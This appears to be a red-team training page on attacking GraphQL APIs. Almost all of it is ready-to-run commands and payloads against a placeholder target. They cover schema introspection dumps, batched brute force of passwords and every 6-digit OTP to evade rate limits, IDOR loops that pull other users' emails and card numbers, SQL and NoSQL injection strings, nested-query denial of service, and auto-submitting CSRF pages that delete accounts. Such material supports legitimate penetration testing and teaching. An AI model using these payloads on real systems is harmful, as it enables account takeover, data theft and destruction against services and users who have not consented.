---
layout: training-page
title: "GraphQL Attacks — Red Team Academy"
module: "Web Hacking"
tags:
  - graphql
  - introspection
  - idor
  - injection
  - batching
page_key: "web-graphql"
render_with_liquid: false
---

# GraphQL Attacks

GraphQL's flexible query language introduces unique attack surfaces: introspection leaks the entire API schema, batching enables DoS and brute-force, resolver misconfigurations allow horizontal access control bypass (BOLA), and improper input handling enables injection. Many apps expose GraphQL without adequate access controls.

## Endpoint Discovery

```
# Common GraphQL endpoints:
/graphql
/graphql/v1
/api/graphql
/graph
/gql
/query
/api/query

# Discover with ffuf:
ffuf -u https://target/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -mc 200,400 -H "Content-Type: application/json"

# Check for GraphQL (send introspection query):
curl -s -X POST https://target/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __typename }"}' | jq .

# GraphQL playground typically at:
https://target/graphql (GET request shows playground UI)
```

## Introspection — Schema Enumeration

Introspection returns the full API schema: all types, queries, mutations, and fields. Many production apps leave it enabled.

```
# Full introspection query:
curl -s -X POST https://target/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name type { name kind ofType { name } } } } } }"}' | jq .

# List all queries and mutations:
curl -s -X POST https://target/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { fields { name description } } mutationType { fields { name description } } } }"}' | jq .

# GraphQL Voyager — visualize schema (browser tool):
# Paste introspection output into https://graphql-voyager.netlify.app/

# InQL (Burp extension + standalone):
pip3 install inql
inql -t https://target/graphql    # dumps schema, generates wordlist

# graphql-cop — security audit tool:
pip3 install graphql-cop
graphql-cop -t https://target/graphql -o json | jq .

# Field suggestions (when introspection disabled):
# GraphQL suggests similar field names on typos:
curl -X POST https://target/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ usrs { id } }"}'
# Response: "Did you mean 'users'?"
# Use this to enumerate field names iteratively
```

## Batching Attacks

GraphQL supports sending multiple queries in one request (batching). This bypasses rate limiting and enables brute force.

```
# Array batching (send N queries in one request):
curl -X POST https://target/graphql \
  -H "Content-Type: application/json" \
  -d '[
    {"query":"mutation { login(user:\"admin\",pass:\"password1\") { token } }"},
    {"query":"mutation { login(user:\"admin\",pass:\"password2\") { token } }"},
    {"query":"mutation { login(user:\"admin\",pass:\"password3\") { token } }"}
  ]'

# Alias batching (alternate syntax — same effect):
curl -X POST https://target/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{
    a: login(user:\"admin\",pass:\"pass1\") { token }
    b: login(user:\"admin\",pass:\"pass2\") { token }
    c: login(user:\"admin\",pass:\"pass3\") { token }
  }"}'

# Brute force OTP via batching (bypass rate limit):
# Generate batch of 10000 OTP guesses in one request
# Tools: Burp Intruder with batching, custom scripts

# GraphQL DoS via deeply nested queries:
curl -X POST https://target/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user { friends { friends { friends { friends { friends { id } } } } } } }"}'
```

## BOLA / IDOR via GraphQL

GraphQL resolvers often fail to check authorization on object-level access — query another user's data by changing their ID.

```
# Classic IDOR — access another user's private data:
# Your user ID is 42:
curl -X POST https://target/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -d '{"query":"{ user(id: 1) { email phone address paymentMethods { cardNumber } } }"}'
# Try IDs 1, 2, 3... to access other users

# UUID-based IDs — use introspection to find numeric or UUID fields
# Mass IDOR — iterate through IDs:
for i in {1..100}; do
  curl -s -X POST https://target/graphql \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer TOKEN" \
    -d "{\"query\":\"{ user(id: $i) { id email } }\"}" | jq '.data.user'
done

# Access admin resolvers without authorization:
# Try mutations available in schema that lack auth:
curl -X POST https://target/graphql \
  -d '{"query":"mutation { deleteUser(id:1) { success } }"}'
```

## GraphQL Injection

```
# SQL injection via GraphQL arguments:
curl -X POST https://target/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user(name: \"admin'--\") { id email } }"}'
# Or use variables (cleaner):
-d '{"query":"query($n:String!){user(name:$n){id email}}","variables":{"n":"admin'--"}}'

# NoSQL injection via GraphQL (MongoDB backend):
-d '{"query":"{ users(filter: \"{$gt: ''}\") { id } }"}'

# SSTI via GraphQL (if description fields are templated):
-d '{"query":"mutation{createPost(content:\"{{7*7}}\"){id content}}"}'
```

## Subscription Attacks

```
# GraphQL subscriptions = real-time WebSocket data
# Connect to subscription endpoint (usually WebSocket):
wscat -c wss://target/graphql \
  -H "Authorization: Bearer TOKEN"

# Subscribe to other users' events:
{"type":"connection_init"}
{"type":"start","id":"1","payload":{"query":"subscription{messageReceived(userId:1){content sender}}"}}

# IDOR in subscriptions — subscribe to another user's notifications
```

## BatchQL — GraphQL Batch Attack Tool

BatchQL is a Python CLI tool that automates GraphQL security checks: it probes for introspection, schema suggestions, CSRF weaknesses, query-name batching support, and JSON list batching support — then uses those findings to launch wordlist-based batch attacks (e.g., credential stuffing against a login mutation). Each batch bundles N requests into a single HTTP call, bypassing per-request rate limits.

### Installation

```
git clone https://github.com/assetnote/batchql
cd batchql
pip3 install -r requirements.txt
```

### Preflight — Security Checks

```
# BatchQL runs 5 automated checks before launching attacks.
# All checks are performed on every run — no flags required.

python3 batch.py -e https://target/graphql

# Checks performed:
# 1. Introspection enabled?          → dumps __schema if yes
# 2. Schema suggestions enabled?     → sends a typo field, checks "Did you mean" in response
# 3. CSRF via GET request?            → sends introspection as a GET; checks for 200 + data
# 4. CSRF via POST (no Content-Type)? → sends bare POST; checks for 200 + data
# 5. Query name batching supported?  → sends [{"operationName":"a",...},{"operationName":"b",...}]
#                                       checks whether both responses are returned
# 6. JSON list batching supported?   → sends [query1, query2]; checks for array response

# Example output:
# [+] Introspection: ENABLED
# [+] Schema suggestions: ENABLED
# [-] CSRF via GET: NOT vulnerable
# [+] CSRF via POST (no Content-Type): VULNERABLE
# [+] Query name batching: SUPPORTED
# [+] JSON list batching: SUPPORTED
```

### Batch Attack — Wordlist-Based Credential Stuffing

```
# Use #VARIABLE# as the placeholder in your query/variables file.
# BatchQL substitutes each wordlist entry in batches of N (default 10).

# Step 1: Write a query file (query.graphql) with the target mutation:
cat query.graphql
# mutation { login(password: "#VARIABLE#") { token } }

# Step 2: Launch batch attack:
python3 batch.py \
  -e https://target/graphql \
  -q query.graphql \
  -w /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
  -s 100        # batch size: 100 queries per HTTP request

# Or use a variables JSON file (cleaner for complex queries):
cat variables.json
# { "password": "#VARIABLE#", "username": "admin" }

python3 batch.py \
  -e https://target/graphql \
  -q query.graphql \
  -v variables.json \
  -w /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
  -s 50

# Full flag reference:
# -e  endpoint URL (required)
# -q  query file containing #VARIABLE# placeholder
# -v  variables JSON file containing #VARIABLE# placeholder
# -w  wordlist file (one entry per line)
# -s  batch size (queries per HTTP request, default 10)
# -p  HTTP proxy (e.g., http://127.0.0.1:8080 for Burp)
# -H  extra header (e.g., -H "Authorization: Bearer TOKEN")
# -o  output file (writes full responses)
```

### OTP / 2FA Brute Force via Batching

```
# Generate all 6-digit OTP values and batch them:
python3 -c "
for i in range(1000000):
    print(str(i).zfill(6))
" > otp.txt

# Query that submits an OTP:
cat otp_query.graphql
# mutation { verifyOtp(code: \"#VARIABLE#\") { verified token } }

# 1M codes in batches of 1000 = 1000 HTTP requests (vs 1M individual):
python3 batch.py \
  -e https://target/graphql \
  -q otp_query.graphql \
  -w otp.txt \
  -s 1000 \
  -o otp_results.txt

# Parse results for successful verification:
grep -i '"verified":true' otp_results.txt
```

### CSRF Exploitation via BatchQL

```
# If BatchQL reports CSRF via POST (no Content-Type): VULNERABLE,
# the GraphQL endpoint accepts requests without a CSRF token or correct Content-Type.

# Exploit: craft an HTML form that auto-submits a mutation:
cat <<'EOF' > csrf.html
<html><body><script>
fetch("https://target/graphql", {
  method: "POST",
  body: JSON.stringify({query: "mutation { deleteAccount { success } }"}),
  credentials: "include"
});
</script></body></html>
EOF

# If CSRF via GET is flagged: introspection (and potentially mutations) run over GET
# Deliver as <img src="https://target/graphql?query=mutation{...}"> in a forum post
```

## GraphQL Injection Payloads

Additional injection payloads and enumeration techniques from PayloadsAllTheThings.

### Identify Injection Point

```
# Quick probe via GET (also tests CSRF via GET):
https://target.com/graphql?query={__schema{types{name}}}
https://target.com/graphiql?query={__schema{types{name}}}

# Error-based discovery:
?query={__schema}             # malformed — triggers helpful error
?query={}                     # empty query error
?query={thisdoesnotexist}     # "Did you mean X?" suggestion leak

# Identify engine via error messages:
?query={__typename}           # returns query root type name
# Apollo: {"data":{"__typename":"Query"}}
# Hasura: different structure
```

### SQL Injection via GraphQL

```
# SQLi in string argument:
{"query":"{ user(name: \"admin'--\") { id email } }"}

# Using variables (cleaner for complex payloads):
{"query":"query($n:String!){user(name:$n){id email}}","variables":{"n":"admin' OR '1'='1"}}

# Blind SQLi via GraphQL:
{"query":"{ user(id: 1 AND SLEEP(5)) { id } }"}

# UNION-based via GraphQL:
{"query":"{ search(term: \"' UNION SELECT username,password FROM users-- \") { results } }"}

# Error-based SQLi:
{"query":"{ user(id: \"1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))\") { id } }"}
```

### NoSQL Injection via GraphQL

```
# MongoDB operator injection (if backend is MongoDB):
{"query":"{ users(filter: \"{\\\"$gt\\\":\\\"\\\"}\") { id } }"}
# Or pass as variable:
{"query":"query($f:String!){users(filter:$f){id}}","variables":{"f":"{\"$gt\":\"\"}"}}
```

## Introspection Queries

Full schema dump queries from PayloadsAllTheThings for use with InQL or manual enumeration.

### Minimal Type Listing

```
{"query":"{ __schema { types { name } } }"}
```

### Full Schema Dump

```
{"query":"{__schema{queryType{name}mutationType{name}types{kind name description fields(includeDeprecated:true){name description args{name description type{kind name ofType{kind name ofType{kind name ofType{kind name}}}}defaultValue}type{kind name ofType{kind name ofType{kind name ofType{kind name}}}}isDeprecated deprecationReason}inputFields{name description type{kind name ofType{kind name ofType{kind name ofType{kind name}}}}defaultValue}interfaces{kind name ofType{kind name ofType{kind name ofType{kind name}}}}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}directives{name description locations args{name description type{kind name ofType{kind name ofType{kind name ofType{kind name}}}}defaultValue}}}}"}
```

### List All Queries and Mutations

```
{"query":"{ __schema { queryType { fields { name description args { name type { name kind } } } } mutationType { fields { name description args { name type { name kind } } } } } }"}
```

### Enumerate Field Paths with graphql-path-enum

```
# Find all paths to reach a specific type:
pip install graphql-path-enum
# Usage: python3 graphql_path_enum.py -i introspection.json -t User

# Tools:
# graphql-cop — comprehensive security audit:
pip install graphql-cop
graphql-cop -t https://target/graphql -o json | jq .

# GraphQLmap — scripting engine for pentesting:
git clone https://github.com/swisskyrepo/GraphQLmap
python3 graphqlmap.py --url https://target/graphql --method POST

# Clairvoyance — schema inference without introspection:
pip install clairvoyance
clairvoyance https://target/graphql -o schema.json
```

## GraphQL CSRF

CSRF exploitation via GraphQL from PayloadsAllTheThings.

### CSRF via GET Request

```
<!-- If introspection or mutations work over GET: -->
<img src="https://target/graphql?query=mutation{deleteAccount{success}}">

<!-- Deliver via forum post, email, or XSS -->
```

### CSRF via POST Without Content-Type

```
<!-- If GraphQL accepts POST without Content-Type header (no CORS preflight): -->
<html><body><script>
fetch("https://target/graphql", {
  method: "POST",
  body: JSON.stringify({query: "mutation { deleteAccount { success } }"}),
  credentials: "include"
  // Note: no Content-Type header means text/plain → no preflight
});
</script></body></html>

<!-- Test with BatchQL: -->
python3 batch.py -e https://target/graphql
# Look for: [+] CSRF via POST (no Content-Type): VULNERABLE
```

### CSRF via multipart/form-data

```
<!-- Some GraphQL endpoints accept multipart uploads (file upload mutations) -->
<!-- multipart requests don't require preflight for simple form enctype -->
<form action="https://target/graphql" method="POST" enctype="multipart/form-data">
  <input name="operations" value='{"query":"mutation{deleteUser{ok}}"}'>
  <input name="map" value="{}">
  <input type="submit">
</form>
```

## Tools & Resources

- BatchQL — `github.com/assetnote/batchql`
- InQL (Burp + CLI) — `github.com/doyensec/inql`
- graphql-cop — `github.com/dolevf/graphql-cop`
- GraphQL Voyager — schema visualizer
- Clairvoyance — `github.com/nicholasaleks/clairvoyance` (field guessing when introspection disabled)
- HackTricks GraphQL — `book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql`
- PortSwigger GraphQL labs — `portswigger.net/web-security/graphql`
